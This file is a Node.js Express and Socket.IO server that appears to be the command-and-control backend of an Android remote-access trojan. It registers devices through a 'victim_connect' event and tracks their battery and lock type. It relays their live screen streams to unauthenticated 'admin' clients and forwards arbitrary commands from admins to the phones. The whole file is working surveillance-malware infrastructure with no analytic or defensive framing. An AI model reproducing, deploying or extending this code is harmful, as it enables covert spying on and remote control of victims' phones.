const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling']
});

// Serve static files
app.use(express.static('public'));
app.use(express.json());

// Store connected devices and admins
const devices = new Map();
const admins = new Map();

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Admin joins
    socket.on('admin_join', () => {
        console.log('Admin joined:', socket.id);
        admins.set(socket.id, { socket, type: 'admin' });
        
        // Send current device list to admin
        const deviceList = Array.from(devices.values()).map(device => ({
            deviceId: device.deviceId,
            deviceName: device.deviceName,
            androidVersion: device.androidVersion,
            battery: device.battery,
            lockType: device.lockType,
            socketId: device.socket.id,
            lastSeen: device.lastSeen
        }));
        
        socket.emit('device_list', deviceList);
    });

    // Device joins
    socket.on('victim_connect', (deviceInfo) => {
        console.log('Device connected:', deviceInfo.deviceId);
        
        devices.set(deviceInfo.deviceId, {
            ...deviceInfo,
            socket: socket,
            lastSeen: Date.now(),
            isOnline: true
        });

        // Notify all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('new_device_joined', {
                    ...deviceInfo,
                    socketId: socket.id
                });
            }
        });
    });

    // Device heartbeat
    socket.on('heartbeat', (data) => {
        if (data.deviceId && devices.has(data.deviceId)) {
            const device = devices.get(data.deviceId);
            device.lastSeen = Date.now();
            device.battery = data.battery;
            device.lockType = data.lockType;
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_heartbeat', {
                        deviceId: data.deviceId,
                        battery: data.battery,
                        lockType: data.lockType
                    });
                }
            });
        }
    });

    // Screen data from device
    socket.on('screen_data', (data) => {
        // Broadcast to all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('screen_data', data);
            }
        });
    });

    // Live screen stream from device
    socket.on('live_screen', (data) => {
        // Broadcast to all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('live_screen', data);
            }
        });
    });

    // Commands from admin to device
    socket.on('command_to_device', (data) => {
        const { deviceId, action, payload } = data;
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            if (device.socket.connected) {
                device.socket.emit(action, payload);
                console.log(`Command sent to ${deviceId}: ${action}`);
            } else {
                console.log(`Device ${deviceId} not connected`);
                socket.emit('command_error', { deviceId, error: 'Device not connected' });
            }
        } else {
            console.log(`Device ${deviceId} not found`);
            socket.emit('command_error', { deviceId, error: 'Device not found' });
        }
    });

    // Device disconnect
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        
        // Check if it was a device
        let disconnectedDeviceId = null;
        for (const [deviceId, device] of devices.entries()) {
            if (device.socket.id === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        
        if (disconnectedDeviceId) {
            devices.delete(disconnectedDeviceId);
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_disconnected', disconnectedDeviceId);
                }
            });
            
            console.log(`Device ${disconnectedDeviceId} removed`);
        }
        
        // Check if it was an admin
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log('Admin removed:', socket.id);
        }
    });
});

// Cleanup disconnected devices periodically
setInterval(() => {
    const now = Date.now();
    const timeout = 30000; // 30 seconds
    
    for (const [deviceId, device] of devices.entries()) {
        if (now - device.lastSeen > timeout) {
            console.log(`Removing inactive device: ${deviceId}`);
            devices.delete(deviceId);
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_disconnected', deviceId);
                }
            });
        }
    }
}, 10000);

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
